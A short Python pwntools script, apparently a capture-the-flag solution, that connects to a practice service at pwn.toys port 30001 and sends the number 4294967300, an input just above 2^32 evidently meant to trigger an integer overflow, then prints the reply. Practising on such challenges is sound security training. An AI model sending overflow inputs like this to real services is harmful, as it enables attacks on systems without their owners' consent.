from pwn import *

# Connect to the program over a network connection
conn = remote('pwn.toys', 30001)

# Send the input value to the program
conn.sendline('4294967300')

# Wait for the program to respond
response = conn.recvall()

# Print the program's output
print(response)

